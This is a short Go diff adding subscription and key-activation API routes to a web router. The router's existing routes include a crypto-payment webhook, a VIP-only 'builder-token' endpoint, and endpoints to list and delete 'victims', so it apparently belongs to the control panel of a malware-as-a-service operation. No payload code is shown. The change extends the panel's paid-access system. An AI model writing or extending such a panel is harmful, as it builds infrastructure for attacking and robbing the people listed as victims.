@@ -38,6 +38,8 @@ func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 	r.HandleFunc("/api/cryptopay/webhook", s.handleCryptoPayWebhook)
 
 	r.Route("/api", func(r chi.Router) {
+		r.Get("/subscription", s.requireAPIAuth(s.handleGetSubscription))
+		r.Post("/activate-key", s.requireAPIAuth(s.handleActivateKey))
 		r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
 		r.Get("/victims", s.requireVIP(s.handleGetVictims))
 		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
